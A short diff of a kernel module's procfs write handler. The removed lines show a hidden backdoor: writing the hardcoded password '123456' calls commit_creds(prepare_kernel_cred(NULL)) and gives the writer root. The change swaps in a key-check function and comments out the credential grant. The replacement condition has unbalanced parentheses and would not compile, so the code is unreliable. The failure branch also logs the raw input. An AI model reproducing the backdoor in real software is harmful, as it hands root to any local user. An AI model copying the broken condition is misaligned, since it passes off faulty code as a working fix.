@@ -123,10 +123,11 @@ static ssize_t fmac_root_write(struct file *file, const char __user *buffer,
     if (kbuf[count - 1] == '\n')
         kbuf[count - 1] = '\0';
 
-    if (strcmp(kbuf, "123456") == 0) {
+    if (fmac_check_root_key(kbuf)) == 1) {
         fmac_append_to_log("[FMAC] [root] Auth success: UID=%u, PID=%d, COMM=%s\n",
                            uid, pid, comm);
-        commit_creds(prepare_kernel_cred(NULL));
+       // commit_creds(prepare_kernel_cred(NULL));
+       
     } else {
         fmac_append_to_log("[FMAC] [root] Auth failed from UID=%u, PID=%d, COMM=%s, input='%s'\n",
                            uid, pid, comm, kbuf);
